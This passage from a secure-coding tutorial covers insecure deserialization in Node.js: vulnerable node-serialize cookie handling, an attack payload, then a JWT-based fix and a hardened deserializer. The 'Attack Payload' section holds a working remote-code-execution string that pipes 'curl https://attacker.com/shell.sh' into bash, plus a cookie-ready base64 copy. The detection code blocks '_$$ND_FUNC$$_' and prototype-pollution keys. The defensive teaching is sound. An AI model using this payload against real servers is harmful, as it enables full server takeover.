    );

    res.json({
      username: sessionData.username,
      role: sessionData.role
    });
  } else {
    res.status(401).json({ error: 'No session' });
  }
});

// Setting session cookie
app.post('/login', (req, res) => {
  const sessionData = {
    username: req.body.username,
    role: 'user',
    loggedIn: true
  };

  const serialized = serialize.serialize(sessionData);
  res.cookie('session', Buffer.from(serialized).toString('base64'));
  res.json({ success: true });
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized object with IIFE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/shell.sh | bash')}()"}

// Base64 encoded for cookie:
// eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCBodHRwczovL2F0dGFja2VyLmNvbS9zaGVsbC5zaCB8IGJhc2gnKX0oKSJ9
```

**Why This Is Dangerous**:
- `node-serialize` evaluates JavaScript functions embedded in serialized data
- The `_$$ND_FUNC$$_` prefix triggers function reconstruction and execution
- IIFE syntax `()` at the end causes immediate execution during deserialization
- Attacker gains full RCE with the Node.js process privileges

**SECURE VERSION**:

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const Joi = require('joi');

const app = express();
app.use(cookieParser());
app.use(express.json());

// Secret should be from environment variable
const JWT_SECRET = process.env.JWT_SECRET || 'change-me-in-production';

// Define strict schema for session data
const sessionSchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  role: Joi.string().valid('user', 'admin', 'moderator').required(),
  loggedIn: Joi.boolean().required()
});

// SECURE: Use JWT instead of arbitrary object serialization
app.get('/profile', (req, res) => {
  const token = req.cookies.session;

  if (!token) {
    return res.status(401).json({ error: 'No session' });
  }

  try {
    // JWT verification - cryptographically signed, cannot be tampered
    const sessionData = jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'],  // Prevent algorithm confusion attacks
      maxAge: '1h'            // Token expiration
    });

    // Additional validation of payload structure
    const { error, value } = sessionSchema.validate(sessionData);
    if (error) {
      console.error('Invalid session structure:', error.message);
      return res.status(401).json({ error: 'Invalid session' });
    }

    res.json({
      username: value.username,
      role: value.role
    });
  } catch (err) {
    console.error('JWT verification failed:', err.message);
    res.clearCookie('session');
    res.status(401).json({ error: 'Invalid session' });
  }
});

app.post('/login', (req, res) => {
  // Validate and sanitize input before including in token
  const sessionData = {
    username: req.body.username,
    role: 'user',
    loggedIn: true
  };

  const { error } = sessionSchema.validate(sessionData);
  if (error) {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const token = jwt.sign(sessionData, JWT_SECRET, {
    algorithm: 'HS256',
    expiresIn: '1h'
  });

  res.cookie('session', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 3600000
  });

  res.json({ success: true });
});

app.listen(3000);
```

**Key Security Controls**:
- **JWT instead of serialization**: Data is signed, not arbitrary code
- **Schema validation**: Joi enforces strict data structure, preventing unexpected properties
- **Algorithm pinning**: Prevents algorithm confusion attacks (CVE-2015-9235)
- **Secure cookie flags**: httpOnly, secure, sameSite prevent cookie theft

When dealing with complex data structures or external API data, you need defense-in-depth with strict validation, schema enforcement, and safe deserialization patterns. Never trust external data.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const Ajv = require('ajv');
const addFormats = require('ajv-formats');
const crypto = require('crypto');
const winston = require('winston');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json({ limit: '10kb' }));  // Limit payload size

// Structured logging for security events
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'security.log' })
  ]
});

// JSON Schema validator
const ajv = new Ajv({ allErrors: true, removeAdditional: true });
addFormats(ajv);

// Define strict schema for external data
const externalDataSchema = {
  type: 'object',
  properties: {
    id: { type: 'string', format: 'uuid' },
    timestamp: { type: 'string', format: 'date-time' },
    payload: {
      type: 'object',
      properties: {
        action: { type: 'string', enum: ['create', 'update', 'delete'] },
        resourceId: { type: 'integer', minimum: 1, maximum: 999999999 },
        data: {
          type: 'object',
          additionalProperties: false,  // Reject unknown properties
          properties: {
            name: { type: 'string', maxLength: 100, pattern: '^[a-zA-Z0-9\\s-]+$' },
            value: { type: 'number', minimum: 0, maximum: 1000000 }
          },
          required: ['name']
        }
      },
      required: ['action', 'resourceId'],
      additionalProperties: false
    }
  },
  required: ['id', 'timestamp', 'payload'],
  additionalProperties: false
};

const validateExternalData = ajv.compile(externalDataSchema);

// Safe deserializer class with multiple defense layers
class SafeDeserializer {
  constructor(options = {}) {
    this.maxDepth = options.maxDepth || 10;
    this.maxKeys = options.maxKeys || 100;
    this.forbiddenKeys = new Set([
      '__proto__', 'constructor', 'prototype',
      '__defineGetter__', '__defineSetter__',
      '__lookupGetter__', '__lookupSetter__'
    ]);
  }

  // Safe JSON parse with prototype pollution prevention
  parse(jsonString, schema = null) {
    if (typeof jsonString !== 'string') {
      throw new Error('Input must be a string');
    }

    if (jsonString.length > 1024 * 1024) {  // 1MB limit
      throw new Error('Payload too large');
    }

    let parsed;
    try {
      // Use reviver to sanitize during parsing
      parsed = JSON.parse(jsonString, (key, value) => {
        // Block prototype pollution attacks
        if (this.forbiddenKeys.has(key)) {
          logger.warn('Blocked forbidden key in JSON', { key });
          return undefined;
        }

        // Block function-like strings that could be eval'd
        if (typeof value === 'string') {
          if (value.includes('_$$ND_FUNC$$_') || 
              value.includes('function(') ||
              value.includes('=>')) {
            logger.warn('Blocked potential code injection', { 
              key, 
              preview: value.substring(0, 50) 
            });
            return '[REDACTED]';
          }
        }

        return value;
      });
    } catch (e) {
      throw new Error('Invalid JSON format');
    }

    // Validate structure depth and complexity
    this.validateStructure(parsed, 0);

    // Apply schema validation if provided
    if (schema) {
      const validate = typeof schema === 'function' ? schema : ajv.compile(schema);
      if (!validate(parsed)) {
        const errors = validate.errors.map(e => `${e.instancePath} ${e.message}`);
        throw new Error(`Schema validation failed: ${errors.join(', ')}`);
      }
    }

    // Create clean object without prototype chain issues
    return this.deepClean(parsed);
  }

  validateStructure(obj, depth) {
    if (depth > this.maxDepth) {
      throw new Error('Maximum nesting depth exceeded');
    }

    if (obj && typeof obj === 'object') {
      const keys = Object.keys(obj);
      if (keys.length > this.maxKeys) {
        throw new Error('Maximum keys exceeded');
      }

      for (const key of keys) {
        this.validateStructure(obj[key], depth + 1);
      }
    }
  }

  deepClean(obj) {
    if (obj === null || typeof obj !== 'object') {
      return obj;
    }

    if (Array.isArray(obj)) {
      return obj.map(item => this.deepClean(item));
    }

    // Create object with null prototype to prevent pollution
    const cleaned = Object.create(null);
    for (const [key, value] of Object.entries(obj)) {
      if (!this.forbiddenKeys.has(key)) {
        cleaned[key] = this.deepClean(value);
      }
    }
    return cleaned;
  }
}

const deserializer = new SafeDeserializer({ maxDepth: 5, maxKeys: 50 });

// HMAC signature verification for external API data
function verifySignature(payload, signature, secret) {
  const expectedSignature = crypto
    .createHmac('sha256', secret)
    .update(payload)
    .digest('hex');

  return crypto.timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expectedSignature)
  );
}

// Rate limiting
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100,
  message: { error: 'Too many requests' }
});

// Production endpoint for external data
app.post('/api/webhook', apiLimiter, (req, res) => {
  const requestId = crypto.randomUUID();
  const startTime = Date.now();

  try {
    // Layer 1: Verify signature from trusted source
    const signature = req.headers['x-signature'];
    const rawBody = JSON.stringify(req.body);

    if (!signature || !verifySignature(rawBody, signature, process.env.WEBHOOK_SECRET)) {
      logger.warn('Invalid webhook signature', { 
        requestId, 
        ip: req.ip 
      });
      return res.status(401).json({ error: 'Invalid signature' });
    }

    // Layer 2: Safe deserialization with schema validation
    const safeData = deserializer.parse(
      rawBody, 
      validateExternalData
    );

    // Layer 3: Business logic validation
    if (new Date(safeData.timestamp) < new Date(Date.now() - 300000)) {
      logger.warn('Stale webhook rejected', { requestId });
      return res.status(400).json({ error: 'Request expired' });
    }

    // Process the validated data
    logger.info('Webhook processed successfully', {
      requestId,
      action: safeData.payload.action,
      resourceId: safeData.payload.resourceId,
      duration: Date.now() - startTime
    });

    res.json({ success: true, id: requestId });

  } catch (error) {
    logger.error('Webhook processing failed', {
      requestId,
      error: error.message,
      ip: req.ip
    });

    res.status(400).json({ 
      error: 'Invalid payload',
      requestId  // For support/debugging
    });
  }
});

app.listen(3000, () => {
  console.log('Server running with safe deserialization');
});
```

